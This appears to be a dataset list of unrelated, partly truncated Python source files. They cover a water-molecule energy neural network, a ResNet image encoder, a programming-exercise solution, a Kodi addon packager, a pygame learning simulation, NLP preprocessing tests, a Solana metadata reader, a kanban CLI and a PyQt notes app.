    "import numpy as np\nimport matplotlib.pyplot as plt\nimport tensorflow as tf\nimport keras \nfrom sklearn.preprocessing import StandardScaler\nfrom sklearn.metrics import mean_squared_error\nfrom keras.callbacks import EarlyStopping\nnp.set_printoptions(precision = 3)\nprint(\"TensorFlow version:\", tf.__version__)\n\n#reads coordinate file and returns list of molecular coordinates\ndef read_coordinates(file_name):\n    coords, c = [], []\n    with open(file_name) as f:\n        for line in f:\n            if line[0] == 'H' or line[0] == 'O':\n                l = line.split()\n                c.append(float(l[1]))\n                c.append(float(l[2]))\n                c.append(float(l[3]))\n                if len(c) == 9:\n                    coords.append(c)\n                    c = []\n    return coords\n\n#reads the energy file and returns an array of molecular energies (i.e., the labels)\ndef read_energy(file_name):\n    energy = []\n    with open(file_name) as f:\n        for line in f:\n            l = line.strip()\n            energy.append(float(l))\n    energy_arr = np.array(energy, dtype=float)\n    return energy_arr\n\n#calculating the interatmic distance for each molecule (i.e., the features)\ndef calculate_distance(coordinates):\n    distances = np.zeros(shape=(len(coordinates), 3))\n    for i, coords in enumerate(coordinates):\n        oh1 = np.sqrt((coords[0] - coords[3])**2 + (coords[1] - coords[4])**2 + (coords[2] - coords[5])**2)\n        oh2 = np.sqrt((coords[6] - coords[3])**2 + (coords[7] - coords[4])**2 + (coords[8] - coords[5])**2)\n        hh = np.sqrt((coords[0] - coords[6])**2 + (coords[1] - coords[7])**2 + (coords[2] - coords[8])**2)\n        distances[i] = [oh1, oh2, hh]\n    return distances\n\n#model architecture\ndef model(node1, node2, node3, reg):\n    model = keras.models.Sequential([\n    keras.layers.Input(shape = (3,)),\n    keras.layers.Dense(node1, activation = \"relu\", kernel_regularizer = keras.regularizers.l2(reg), \n                       bias_regularizer = keras.regularizers.l2(reg)),\n    keras.layers.Dense(node2, activation = \"relu\", kernel_regularizer = keras.regularizers.l2(reg), \n                       bias_regularizer = keras.regularizers.l2(reg)),\n    keras.layers.Dense(node3, activation = \"relu\", kernel_regularizer = keras.regularizers.l2(reg), \n                       bias_regularizer = keras.regularizers.l2(reg)),                 \n    keras.layers.Dense(1, kernel_regularizer = keras.regularizers.l2(reg), use_bias=False)])\n    return model\n\n#determine learning curve\ndef learning_curve(model, x_train, y_train, x_test, y_test, training_size, epochs, n_avg):\n    train_errors, val_errors = [], []\n    print(\"generating learning curve\")\n    for m in training_size:\n        print(\"-->training set size in progress:\", m)\n        train_avg = 0\n        val_avg = 0\n        for n in range(n_avg):\n            model.fit(x_train[:m], y_train[:m], epochs=epochs,  verbose = 0)\n            y_train_predict = model.predict(x_train[:m], verbose = 0)\n            y_val_predict = model.predict(x_test, verbose = 0)\n            train_mse = mean_squared_error(y_train[:m], y_train_predict)\n            val_mse = mean_squared_error(y_test, y_val_predict)\n            train_avg += train_mse\n            val_avg += val_mse\n        train_avg /= n_avg\n        val_avg /= n_avg\n        train_errors.append(train_avg)\n        val_errors.append(val_avg)\n    return np.sqrt(train_errors), np.sqrt(val_errors)\n\n#plotting predicitions\ndef plot_predictions(y_test, predictions, ax, file_name):\n    ax.scatter(y_test, predictions, color = \"blue\", alpha = 0.7)\n    ax.plot([min(y_test), max(y_test)], [min(y_test), max(y_test)], ls = \"--\", c = \"black\")\n    ax.set_title(f\"H2O energy predictions for {file_name}\")\n    ax.set_xlabel(\"True energy values\")\n    ax.set_ylabel(\"Predicted energy values\")\n    ax.grid()\n\n#plotting loss vs epochs\ndef plot_loss(training_loss, validation_loss, ax, file_name):\n    ax.plot(training_loss, label = \"Training loss\", c = \"blue\")\n    ax.plot(validation_loss, label = \"Validation loss\", c = \"orange\")\n    ax.set_title(f\"Model loss for {file_name}\")\n    ax.set_xlabel(\"Epochs\")\n    ax.set_ylabel(\"Loss - MSE\")\n    ax.grid()\n    ax.legend()\n\n#plotting learning curve\ndef plot_learning_curve(training_points, train_errors, val_errors, ax, file_name):\n    ax.plot(training_points, train_errors, \"-o\", label = \"Training\")\n    ax.plot(training_points, val_errors, \"-o\", label = \"Validation\")\n    ax.set_title(f\"Learning curve for {file_name}\")\n    ax.set_xlabel(\"Training set size\")\n    ax.set_ylabel(\"RMSE\")\n    ax.legend()\n    ax.grid()\n\nif __name__ == \"__main__\":\n    #looping through both training data sets and generating the three plots for each\n    data_sets = [(\"H2O_unrotated.xyz\", \"H2O_unrotated.ener\"), (\"H2O_rotated.xyz\", \"H2O_rotated.ener\")]\n    fig, axes = plt.subplots(3, len(data_sets), figsize = (15, 15))\n    for i, (coord_file, energy_file) in enumerate(data_sets):\n        #reading the training/test files\n        training_coords = read_coor",
    "from collections import OrderedDict\nfrom typing import Tuple, Union\n\nimport numpy as np\nimport torch\nimport torch.nn.functional as F\nfrom torch import nn\n\n\nclass Bottleneck(nn.Module):\n    expansion = 4\n\n    def __init__(self, inplanes, planes, stride=1):\n        super().__init__()\n\n        # all conv layers have stride 1. an avgpool is performed after the second convolution when stride > 1\n        self.conv1 = nn.Conv2d(inplanes, planes, 1, bias=False)\n        self.bn1 = nn.BatchNorm2d(planes)\n        self.relu1 = nn.ReLU(inplace=True)\n\n        self.conv2 = nn.Conv2d(planes, planes, 3, padding=1, bias=False)\n        self.bn2 = nn.BatchNorm2d(planes)\n        self.relu2 = nn.ReLU(inplace=True)\n\n        self.avgpool = nn.AvgPool2d(stride) if stride > 1 else nn.Identity()\n\n        self.conv3 = nn.Conv2d(planes, planes * self.expansion, 1, bias=False)\n        self.bn3 = nn.BatchNorm2d(planes * self.expansion)\n        self.relu3 = nn.ReLU(inplace=True)\n\n        self.downsample = None\n        self.stride = stride\n\n        if stride > 1 or inplanes != planes * Bottleneck.expansion:\n            # downsampling layer is prepended with an avgpool, and the subsequent convolution has stride 1\n            self.downsample = nn.Sequential(OrderedDict([\n                (\"-1\", nn.AvgPool2d(stride)),\n                (\"0\", nn.Conv2d(inplanes, planes * self.expansion, 1, stride=1, bias=False)),\n                (\"1\", nn.BatchNorm2d(planes * self.expansion))\n            ]))\n\n    def forward(self, x: torch.Tensor):\n        identity = x\n\n        out = self.relu1(self.bn1(self.conv1(x)))\n        out = self.relu2(self.bn2(self.conv2(out)))\n        out = self.avgpool(out)\n        out = self.bn3(self.conv3(out))\n\n        if self.downsample is not None:\n            identity = self.downsample(x)\n\n        out += identity\n        out = self.relu3(out)\n        return out\n\n\nclass AttentionPool2d(nn.Module):\n    def __init__(self, spacial_dim: int, embed_dim: int, num_heads: int, output_dim: int = None):\n        super().__init__()\n        self.positional_embedding = nn.Parameter(torch.randn(spacial_dim ** 2 + 1, embed_dim) / embed_dim ** 0.5)\n        self.k_proj = nn.Linear(embed_dim, embed_dim)\n        self.q_proj = nn.Linear(embed_dim, embed_dim)\n        self.v_proj = nn.Linear(embed_dim, embed_dim)\n        self.c_proj = nn.Linear(embed_dim, output_dim or embed_dim)\n        self.num_heads = num_heads\n\n    def forward(self, x):\n        x = x.flatten(start_dim=2).permute(2, 0, 1)  # NCHW -> (HW)NC\n        x = torch.cat([x.mean(dim=0, keepdim=True), x], dim=0)  # (HW+1)NC\n        x = x + self.positional_embedding[:, None, :].to(x.dtype)  # (HW+1)NC\n        x, _ = F.multi_head_attention_forward(\n            query=x[:1], key=x, value=x,\n            embed_dim_to_check=x.shape[-1],\n            num_heads=self.num_heads,\n            q_proj_weight=self.q_proj.weight,\n            k_proj_weight=self.k_proj.weight,\n            v_proj_weight=self.v_proj.weight,\n            in_proj_weight=None,\n            in_proj_bias=torch.cat([self.q_proj.bias, self.k_proj.bias, self.v_proj.bias]),\n            bias_k=None,\n            bias_v=None,\n            add_zero_attn=False,\n            dropout_p=0,\n            out_proj_weight=self.c_proj.weight,\n            out_proj_bias=self.c_proj.bias,\n            use_separate_proj_weight=True,\n            training=self.training,\n            need_weights=False\n        )\n        return x.squeeze(0)\n\n\nclass ModifiedResNet(nn.Module):\n    \"\"\"\n    A ResNet class that is similar to torchvision's but contains the following changes:\n    - There are now 3 \"stem\" convolutions as opposed to 1, with an average pool instead of a max pool.\n    - Performs anti-aliasing strided convolutions, where an avgpool is prepended to convolutions with stride > 1\n    - The final pooling layer is a QKV attention instead of an average pool\n    \"\"\"\n\n    def __init__(self, layers, output_dim, heads, input_resolution=224, width=64):\n        super().__init__()\n        self.output_dim = output_dim\n        self.input_resolution = input_resolution\n\n        # the 3-layer stem\n        self.conv1 = nn.Conv2d(3, width // 2, kernel_size=3, stride=2, padding=1, bias=False)\n        self.bn1 = nn.BatchNorm2d(width // 2)\n        self.relu1 = nn.ReLU(inplace=True)\n        self.conv2 = nn.Conv2d(width // 2, width // 2, kernel_size=3, padding=1, bias=False)\n        self.bn2 = nn.BatchNorm2d(width // 2)\n        self.relu2 = nn.ReLU(inplace=True)\n        self.conv3 = nn.Conv2d(width // 2, width, kernel_size=3, padding=1, bias=False)\n        self.bn3 = nn.BatchNorm2d(width)\n        self.relu3 = nn.ReLU(inplace=True)\n        self.avgpool = nn.AvgPool2d(2)\n\n        # residual layers\n        self._inplanes = width  # this is a *mutable* variable used during construction\n        self.layer1 = self._make_layer(width, layers[0])\n        self.layer2 = self._make_layer(width * 2, layers[1], stride=2)\n        self.layer3 = self._make_layer(width * 4, layers[2], stride=2)\n        self.",
    "'''Vishakan, a dedicated reader, has a limited time to indulge in his favorite activity: reading books in the library. Each book has its own unique charm, but Vishakan needs to optimize his time to read as many books as possible within his available time.\n\nInput:\n\nThe first line contains two integers,(n) and (t) where, (1 <= n <= 10^5) and (1 <= t <= 10^9), denoting the number of books in the library and the total free minutes Vishakan has.\nThe second line contains( n) space-separated integers (a1, a2,...., an) where (1 <= ai <= 10^4), representing the time required to read each book.\nOutput:\n\nPrint a single integer, the maximum number of books Vishakan can read within his available time.\nConstraints:\n\nVishakan has a maximum of( 10^9) minutes to spend in the library.\nEach book takes between 1 and 10,000 minutes to read.\nSample input:\n\n3 3\n2 2 3\n\nSample output:\n\n1\n\n'''\n\nimport sys\nfrom collections import deque, defaultdict\n\nI = sys.stdin.readline\n\ndef ii():\n    return int(I().strip())\n\ndef li():\n    return list(map(int, I().strip().split()))\n\ndef mi():\n    return map(int, I().strip().split())\n\ndef main():\n    n, k = mi()\n    arr = li()\n    \n    #..... YOUR CODE STARTS HERE .....\n    \n    arr.sort()\n    books_read=0\n    total_time=0\n    for time in arr:\n        if total_time+time<=k:\n            total_time+=time\n            books_read+=1\n        else:\n            break\n    print(books_read)\n    \n    #..... YOUR CODE ENDS HERE .....\n\nif __name__ == '__main__':\n    main()",
    "\"\"\" \n    Put this script in the root folder of your repo and it will\n    zip up all addon folders, create a new zip in your zips folder\n    and then update the md5 and addons.xml file\n\"\"\"\n\nimport hashlib\nimport os\nimport shutil\nimport sys\nimport zipfile\n\nfrom xml.etree import ElementTree\n\nSCRIPT_VERSION = 5\nKODI_VERSIONS = [\"krypton\", \"leia\", \"matrix\", \"nexus\", \"omega\", \"repo\"]\nIGNORE = [\n    \".git\",\n    \".github\",\n    \".gitignore\",\n    \".DS_Store\",\n    \"thumbs.db\",\n    \".idea\",\n    \"venv\",\n]\n_COLOR_ESCAPE = \"\\x1b[{}m\"\n_COLORS = {\n    \"black\": \"30\",\n    \"red\": \"31\",\n    \"green\": \"4;32\",\n    \"yellow\": \"3;33\",\n    \"blue\": \"34\",\n    \"magenta\": \"35\",\n    \"cyan\": \"1;36\",\n    \"grey\": \"37\",\n    \"endc\": \"0\",\n}\n\n\ndef _setup_colors():\n    \"\"\"\n    Return True if the running system's terminal supports color,\n    and False otherwise.\n    \"\"\"\n\n    def vt_codes_enabled_in_windows_registry():\n        \"\"\"\n        Check the Windows registry to see if VT code handling has been enabled by default.\n        \"\"\"\n        try:\n            import winreg\n        except:\n            return False\n        else:\n            reg_key = winreg.OpenKey(\n                winreg.HKEY_CURRENT_USER, \"Console\", access=winreg.KEY_ALL_ACCESS\n            )\n            try:\n                reg_key_value, _ = winreg.QueryValueEx(reg_key, \"VirtualTerminalLevel\")\n            except FileNotFoundError:\n                try:\n                    winreg.SetValueEx(\n                        reg_key, \"VirtualTerminalLevel\", 0, winreg.KEY_DWORD, 1\n                    )\n                except:\n                    return False\n                else:\n                    reg_key_value, _ = winreg.QueryValueEx(\n                        reg_key, \"VirtualTerminalLevel\"\n                    )\n            else:\n                return reg_key_value == 1\n\n    def is_a_tty():\n        return hasattr(sys.stdout, \"isatty\") and sys.stdout.isatty()\n\n    def legacy_support():\n        console = 0\n        color = 0\n        if sys.platform in [\"linux\", \"linux2\", \"darwin\"]:\n            pass\n        elif sys.platform == \"win32\":\n            color = os.system(\"color\")\n\n            from ctypes import windll\n\n            k = windll.kernel32\n            console = k.SetConsoleMode(k.GetStdHandle(-11), 7)\n\n        return any([color == 1, console == 1])\n\n    return any(\n        [\n            is_a_tty(),\n            sys.platform != \"win32\",\n            \"ANSICON\" in os.environ,\n            \"WT_SESSION\" in os.environ,\n            os.environ.get(\"TERM_PROGRAM\") == \"vscode\",\n            vt_codes_enabled_in_windows_registry(),\n            legacy_support(),\n        ]\n    )\n\n\n_SUPPORTS_COLOR = _setup_colors()\n\n\ndef color_text(text, color):\n    \"\"\"\n    Return an ANSI-colored string, if supported.\n    \"\"\"\n\n    return (\n        '{}{}{}'.format(\n            _COLOR_ESCAPE.format(_COLORS[color]),\n            text,\n            _COLOR_ESCAPE.format(_COLORS[\"endc\"]),\n        )\n        if _SUPPORTS_COLOR\n        else text\n    )\n\n\ndef convert_bytes(num):\n    \"\"\"\n    this function will convert bytes to MB.... GB... etc\n    \"\"\"\n    for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:\n        if num < 1024.0:\n            return \"%3.1f %s\" % (num, x)\n        num /= 1024.0\n\n\nclass Generator:\n    \"\"\"\n    Generates a new addons.xml file from each addons addon.xml file\n    and a new addons.xml.md5 hash file. Must be run from the root of\n    the checked-out repo.\n    \"\"\"\n\n    def __init__(self, release):\n        self.release_path = release\n        self.zips_path = os.path.join(self.release_path, \"zips\")\n        addons_xml_path = os.path.join(self.zips_path, \"addons.xml\")\n        md5_path = os.path.join(self.zips_path, \"addons.xml.md5\")\n\n        if not os.path.exists(self.zips_path):\n            os.makedirs(self.zips_path)\n\n        self._remove_binaries()\n\n        if self._generate_addons_file(addons_xml_path):\n            print(\n                \"Successfully updated {}\".format(color_text(addons_xml_path, 'yellow'))\n            )\n\n            if self._generate_md5_file(addons_xml_path, md5_path):\n                print(\"Successfully updated {}\".format(color_text(md5_path, 'yellow')))\n\n    def _remove_binaries(self):\n        \"\"\"\n        Removes any and all compiled Python files before operations.\n        \"\"\"\n\n        for parent, dirnames, filenames in os.walk(self.release_path):\n            for fn in filenames:\n                if fn.lower().endswith(\"pyo\") or fn.lower().endswith(\"pyc\"):\n                    compiled = os.path.join(parent, fn)\n                    try:\n                        os.remove(compiled)\n                        print(\n                            \"Removed compiled python file: {}\".format(\n                                color_text(compiled, 'green')\n                            )\n                        )\n                    except:\n                        print(\n                            \"Failed to remove compiled python file: {}\".format(\n                                color_text(compiled, 'red')\n               ",
    "import pygame\nimport matplotlib.pyplot as plt\nfrom matplotlib.animation import FuncAnimation\nimport numpy as np\nfrom creature import FlyingCreature\nfrom train_buffer import ReplayBuffer\n\nclass World:\n    def __init__(self, num_creatures,num_creatures_rand = 0,agent_size012=2):\n        self.num_creatures = num_creatures\n        self.creatures  = []\n        self.player_creature = None\n\n        buff = ReplayBuffer(int(1e4))\n        i = 0\n        for _ in range(num_creatures):\n            self.creatures.append(FlyingCreature(i,agent_size012=agent_size012,train_buffer= buff))\n            i +=1\n        self.num_creatures += num_creatures_rand\n        for _ in range(num_creatures_rand):\n            self.creatures.append(FlyingCreature(i,agent_size012=0))\n            i +=1       \n        self.w = 800\n        self.h = 800\n        \n        self.step = -1\n        self.total_reward_list_capacity = int(1e3)\n        self.total_reward_list  = None #np.zeros(self.total_reward_list_capacity)\n\n    def update(self,train=True):\n        self.total_reward_list[self.step%self.total_reward_list_capacity] = 0\n        for creature in self.creatures:\n            c_reward= creature.update(self,train = train)\n            self.total_reward_list[self.step%self.total_reward_list_capacity] += c_reward\n            self.lock_position(creature)\n\n    def update_player(self,wasd):        \n        player_reward = self.player_creature.update_in_control(self,wasd)\n        \n    def action(self):\n        for creature in self.creatures:\n            creature.take_action()\n            self.lock_position(creature)\n        if self.player_creature!= None:\n            self.player_creature.take_action()\n            self.lock_position(self.player_creature)\n\n\n    \n    def lock_position(self,c):\n        creature = c\n        creature.position[0]= creature.position[0]  % self.w\n        creature.position[1]= creature.position[1]  % self.h\n    \n    def render(self, screen):\n        screen.fill((255, 255, 255))  # \u767d\u8272\u80cc\u666f\n        for creature in self.creatures:\n            pygame.draw.polygon(screen, (10, 5, 45), creature.get_vertices())  # \u753b\u51fa\u751f\u7269 \n        if self.player_creature!= None : pygame.draw.polygon(screen, (255, 0, 0), self.player_creature.get_vertices())  # \u753b\u51fa\u751f\u7269\n        pygame.display.flip()\n    \n\n    def execute(self,player):\n        self.player_creature= player \n\n    def run(self,train=False,plot = False):\n        \n        self.step = -1\n        pygame.init()\n        screen = pygame.display.set_mode((self.w, self.h))\n        clock = pygame.time.Clock()\n\n        # \u521b\u5efa\u4e00\u4e2a\u56fe\u8868\n        fig, ax = plt.subplots()\n        x = np.linspace(0, self.total_reward_list_capacity ,self.total_reward_list_capacity)\n        self.total_reward_list  = np.zeros(self.total_reward_list_capacity)\n        \n       \n        \n        running = True\n        while running:\n            wasd = [False,False,False,False]\n            for event in pygame.event.get():\n                if event.type == pygame.QUIT:\n                    running = False\n                elif event.type == pygame.KEYDOWN:\n                    # \u68c0\u6d4b\u6309\u952e\n                    if event.key == pygame.K_w:\n                        wasd[0] = True\n                    elif event.key == pygame.K_a:\n                        wasd[1] = True\n                    elif event.key == pygame.K_s:\n                        wasd[2] = True\n                    elif event.key == pygame.K_d:\n                        wasd[3] = True\n\n            self.step+=1\n            self.update(train=train)\n            if self.player_creature != None :self.update_player(wasd)\n\n            self.action()\n\n            self.render(screen)            \n\n            clock.tick(30)\n\n            #if (self.step % 10 == 0): print(self.step)\n            if (plot and self.step % 50 == 0):\n                print(self.step ,' -- ' , self.total_reward_list[self.step%self.total_reward_list_capacity])\n                print('   ',self.creatures[0].agent.last_q_table )\n            if (self.step >0 and self.step % 1000 == 0):\n                self.save_all('./AUTOSAVE-GAME-MODE')\n                if plot:\n                    plt.plot(x,self.total_reward_list) \n                    plt.show()\n\n\n        pygame.quit()\n        self.save_all('./AUTOSAVE-GAME-MODE')\n\n\n\n    def run_no_play(self,totol_step = 5*1e3):\n        self.step = -1\n        # \u521b\u5efa\u4e00\u4e2a\u56fe\u8868\n        fig, ax = plt.subplots()\n        x = np.linspace(0, self.total_reward_list_capacity ,self.total_reward_list_capacity)\n        self.total_reward_list  = np.zeros(self.total_reward_list_capacity)\n        \n       \n        \n        running = True\n        while running and self.step<totol_step :\n            self.step+=1\n            self.update()\n            self.action()\n            if (self.step % 10 == 0):\n                print(self.step ,' -- ' , self.total_reward_list[self.step%self.total_reward_list_capacity])\n                print('   ',self.creatures[0].agent.last_q_table )\n            if (self.step >0 and self.step % 1000 == 0):\n\n            ",
    "\"\"\"\nTest the preprocess module.\n\"\"\"\n\nimport sys\nimport os\n\ndir_path = os.path.abspath(os.path.join(os.path.dirname(__file__), os.pardir))\nsys.path.append(dir_path)\n\nfrom utils.preprocess import Preprocess\nfrom pandas.core.frame import DataFrame\n\n\nclass TestPreprocess:\n    text = \"Saya sedang belajar pemrosesan bahasa alami. Pemrosesan bahasa alami adalah salah satu cabang ilmu data science.\"\n    query = \"belajar pemrosesan bahasa alami\"\n    preprocess = Preprocess(\"indonesian\")\n\n    def test_preprocess_text(self):\n        \"\"\"\n        Test the preprocess_text method.\n        \"\"\"\n        tokens = self.preprocess.preprocess_text(self.text)\n\n        assert isinstance(tokens, list)\n        assert isinstance(tokens[0], list)\n\n    def test_preprocess_query(self):\n        \"\"\"\n        Test the preprocess_query method.\n        \"\"\"\n        query = self.preprocess.preprocess_query(self.query)\n\n        assert isinstance(query, list)\n\n    def test_remove_duplicate(self):\n        \"\"\"\n        Test the remove_duplicate method.\n        \"\"\"\n        tokens = self.preprocess.preprocess_text(self.text)\n        word_corpus = self.preprocess.remove_duplicate(tokens)\n\n        assert isinstance(word_corpus, list)\n\n    def test_count_query(self):\n        \"\"\"\n        Test the count_query method.\n        \"\"\"\n        query = self.preprocess.preprocess_query(self.query)\n        count_query = self.preprocess.count_query(query)\n\n        assert isinstance(count_query, DataFrame)\n\n    def test_count_word(self):\n        \"\"\"\n        Test the count_word method.\n        \"\"\"\n        tokens = self.preprocess.preprocess_text(self.text)\n        count_word = self.preprocess.count_word(tokens)\n\n        assert isinstance(count_word, DataFrame)\n",
    "import json\r\nimport requests\r\nfrom solana.rpc.api import Client\r\nimport struct\r\nfrom solders.pubkey import Pubkey # type: ignore\r\nimport base58\r\n\r\ndef get_data_from_uri(uri):\r\n    response = requests.get(uri)\r\n    if response.status_code == 200:\r\n        return response.json()\r\n    else:\r\n        raise Exception(f\"Failed to fetch data from URI: {uri}\")\r\n\r\ndef get_metadata_account(token_contract):\r\n    METADATA_PROGRAM_ID = Pubkey.from_string('metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s')\r\n    return Pubkey.find_program_address(\r\n        [b'metadata', bytes(METADATA_PROGRAM_ID), bytes(Pubkey.from_string(token_contract))],\r\n        METADATA_PROGRAM_ID\r\n    )[0]\r\n\r\ndef unpack_metadata_account(data):\r\n    assert(data[0] == 4)\r\n    i = 1\r\n    source_account = base58.b58encode(bytes(struct.unpack('<' + \"B\"*32, data[i:i+32])))\r\n    i += 32\r\n    mint_account = base58.b58encode(bytes(struct.unpack('<' + \"B\"*32, data[i:i+32])))\r\n    i += 32\r\n    name_len = struct.unpack('<I', data[i:i+4])[0]\r\n    i += 4\r\n    name = struct.unpack('<' + \"B\"*name_len, data[i:i+name_len])\r\n    i += name_len\r\n    symbol_len = struct.unpack('<I', data[i:i+4])[0]\r\n    i += 4 \r\n    symbol = struct.unpack('<' + \"B\"*symbol_len, data[i:i+symbol_len])\r\n    i += symbol_len\r\n    uri_len = struct.unpack('<I', data[i:i+4])[0]\r\n    i += 4 \r\n    uri = struct.unpack('<' + \"B\"*uri_len, data[i:i+uri_len])\r\n    i += uri_len\r\n    fee = struct.unpack('<h', data[i:i+2])[0]\r\n    i += 2\r\n    has_creator = data[i] \r\n    i += 1\r\n    creators = []\r\n    verified = []\r\n    share = []\r\n    if has_creator:\r\n        creator_len = struct.unpack('<I', data[i:i+4])[0]\r\n        i += 4\r\n        for _ in range(creator_len):\r\n            creator = base58.b58encode(bytes(struct.unpack('<' + \"B\"*32, data[i:i+32])))\r\n            creators.append(creator)\r\n            i += 32\r\n            verified.append(data[i])\r\n            i += 1\r\n            share.append(data[i])\r\n            i += 1\r\n    primary_sale_happened = bool(data[i])\r\n    i += 1\r\n    is_mutable = bool(data[i])\r\n    metadata = {\r\n        \"update_authority\": source_account.decode(\"utf-8\"),\r\n        \"mint\": mint_account.decode(\"utf-8\"),\r\n        \"data\": {\r\n            \"name\": bytes(name).decode(\"utf-8\").strip(\"\\x00\"),\r\n            \"symbol\": bytes(symbol).decode(\"utf-8\").strip(\"\\x00\"),\r\n            \"uri\": bytes(uri).decode(\"utf-8\").strip(\"\\x00\"),\r\n            \"seller_fee_basis_points\": fee,\r\n            \"creators\": creators,\r\n            \"verified\": verified,\r\n            \"share\": share,\r\n        },\r\n        \"primary_sale_happened\": primary_sale_happened,\r\n        \"is_mutable\": is_mutable,\r\n    }\r\n    return metadata\r\n\r\ndef get_metadata(rpc, token_contract):\r\n    client = Client(rpc)\r\n    metadata_account = get_metadata_account(token_contract)\r\n    data = client.get_account_info(metadata_account).value.data\r\n    metadata = unpack_metadata_account(data)\r\n    return metadata\r\n\r\nif __name__ == \"__main__\":\r\n    rpc = \"https://api.mainnet-beta.solana.com\"\r\n    token_contract = \"some_token_address\"\r\n    metadata = get_metadata(rpc, token_contract)\r\n    uri = metadata[\"data\"][\"uri\"]\r\n    uri_data = get_data_from_uri(uri)\r\n    metadata[\"data\"].update(uri_data)\r\n    print(json.dumps(metadata, indent=4))",
    "from models import Task\nfrom storage import save_data\n\n# Create a new board\ndef create_board(data, name):\n    if name in data['boards']:\n        print(f'Board \"{name}\" already exists.')\n        return\n\n    # Initialize the board with the three statuses\n    data['boards'][name] = {\n        'todo': [],\n        'in_progress': [],\n        'done': []\n    }\n    print(f'Board \"{name}\" created.')\n    save_data(data)\n\n# List existing boards\ndef list_boards(data):\n    print(\"Boards:\")\n    for board_name in data['boards']:\n        print(f'- {board_name}')\n\n# Delete a board\ndef delete_board(data, name):\n    if name not in data['boards']:\n        print(f'Board \"{name}\" does not exist.')\n        return\n\n    del data['boards'][name]\n    print(f'Board \"{name}\" deleted.')\n    save_data(data)\n\n# Create a new task in a board\ndef create_task(data, board_name, title, description, assignee, reporter, status='Todo', priority='Medium'):\n    if board_name not in data['boards']:\n        print(f'Board \"{board_name}\" does not exist.')\n        return\n\n    task_id = len(data['boards'][board_name][status.lower()]) + 1\n    task = Task(task_id, title, description, assignee, reporter, status, priority)\n    data['boards'][board_name][status.lower()].append(task)\n    print(f'Task \"{title}\" created in board \"{board_name}\".')\n    save_data(data)\n\n# List tasks in a board\ndef list_tasks(data, board_name):\n    # Check if board exists\n    if board_name not in data['boards']:\n        print(f'Board \"{board_name}\" does not exist.')\n        return\n\n    board = data['boards'][board_name]\n\n    # List tasks in each status\n    print(f'Tasks in board \"{board_name}\":')\n    for status in ['todo', 'in_progress', 'done']:\n        print(f'\\n{status.capitalize()}:')\n        tasks = board[status]\n        for task in tasks:\n            # Access dictionary keys to retrieve task attributes\n            print(f'- Task ID: {task[\"task_id\"]}, Title: {task[\"title\"]}, Priority: {task[\"priority\"]}, Assignee: {task[\"assignee\"]}, Reporter: {task[\"reporter\"]}')\n\n# Delete a task in a board\ndef delete_task(data, board_name, task_id):\n    if board_name not in data['boards']:\n        print(f'Board \"{board_name}\" does not exist.')\n        return\n\n    board = data['boards'][board_name]\n    task_deleted = False\n\n    # Search and delete the task from each status list\n    for status in ['todo', 'in_progress', 'done']:\n        tasks = board[status]\n        for task in tasks:\n            if task.task_id == int(task_id):\n                tasks.remove(task)\n                print(f'Task ID {task_id} deleted from board \"{board_name}\".')\n                task_deleted = True\n                break\n        if task_deleted:\n            break\n\n    if not task_deleted:\n        print(f'Task ID {task_id} not found in board \"{board_name}\".')\n    else:\n        save_data(data)\n\n# Move a task to a new status\ndef move_task(data, board_name, task_id, new_status):\n    if board_name not in data['boards']:\n        print(f'Board \"{board_name}\" does not exist.')\n        return\n\n    board = data['boards'][board_name]\n    task_moved = False\n\n    # Move task from its current status to new status\n    for status in ['todo', 'in_progress', 'done']:\n        tasks = board[status]\n        for task in tasks:\n            if task.task_id == int(task_id):\n                tasks.remove(task)\n                \n                # Add task to the new status list\n                task.status = new_status\n                board[new_status.lower()].append(task)\n                \n                print(f'Task ID {task_id} moved to {new_status} in board \"{board_name}\".')\n                task_moved = True\n                break\n        if task_moved:\n            break\n\n    if not task_moved:\n        print(f'Task ID {task_id} not found in board \"{board_name}\".')\n    else:\n        save_data(data)\n",
    "from PyQt5.QtCore import Qt\r\nfrom PyQt5.QtWidgets import (QListWidget,QLabel,QPushButton,QApplication,QVBoxLayout,QHBoxLayout,QWidget,QLineEdit,QTextEdit)\r\nimport json\r\n\r\napp = QApplication([])\r\n\r\ntext_field = QTextEdit()\r\ntext_field2 = QTextEdit()\r\n\r\ntext = QLabel('\u0421\u043f\u0438\u0441\u043e\u043a \u0437\u0430\u043c\u0435\u0442\u043e\u043a')\r\ntextiner = QListWidget()\r\ntxtt = QHBoxLayout()\r\nbtn = QPushButton('\u0423\u0434\u0430\u043b\u0438\u0442\u044c \u0437\u0430\u043c\u0435\u0442\u043a\u0443')\r\nbtn2 = QPushButton('\u0421\u043e\u0445\u0440\u0430\u043d\u0438\u0442\u044c \u0437\u0430\u043c\u0435\u0442\u043a\u0443')\r\nbtn3 = QPushButton('\u0421\u043e\u0437\u0434\u0430\u0442\u044c \u0437\u0430\u043c\u0435\u0442\u043a\u0443')\r\ntextiner2 = QListWidget()\r\nbtn4 = QPushButton('\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043a \u0437\u0430\u043c\u0435\u0442\u043a\u0435')\r\nbtn5 = QPushButton('\u041e\u0442\u043a\u0440\u0435\u043f\u0438\u0442\u044c \u043e\u0442 \u0437\u0430\u043c\u0435\u0442\u043a\u0438')\r\nbtn6 = QPushButton('\u0418\u0441\u043a\u0430\u0442\u044c \u0437\u0430\u043c\u0435\u0442\u043a\u0443 \u043f\u043e \u0442\u0435\u0433\u0443')\r\nteger = QLineEdit()\r\nteger.setPlaceholderText('\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0442\u0435\u0433...')\r\n\r\nv1 = QVBoxLayout()\r\nv2 = QVBoxLayout()\r\nh1 = QHBoxLayout()\r\nh2 = QHBoxLayout()\r\n\r\nmain_h1 = QHBoxLayout()\r\nmain_h1.addWidget(text_field,stretch=7)\r\nmain_h1.addLayout(v2,stretch=5)\r\n\r\nv1.addWidget(text)\r\nv2.addWidget(textiner)\r\nv2.addLayout(h1)\r\nh1.addWidget(btn)\r\nh1.addWidget(btn2)\r\nv2.addWidget(btn3)\r\nv2.addWidget(textiner2)\r\nv2.addWidget(teger)\r\nv2.addLayout(h2)\r\nh2.addWidget(btn4)\r\nh2.addWidget(btn5)\r\nv2.addWidget(btn6)\r\n\r\nwindow = QWidget()\r\nwindow.resize(900,600)\r\nwindow.setLayout(main_h1)\r\n\r\nlist_tages = QListWidget()\r\n\r\nfield_tag = QLineEdit()\r\n\r\nmain_w1 = 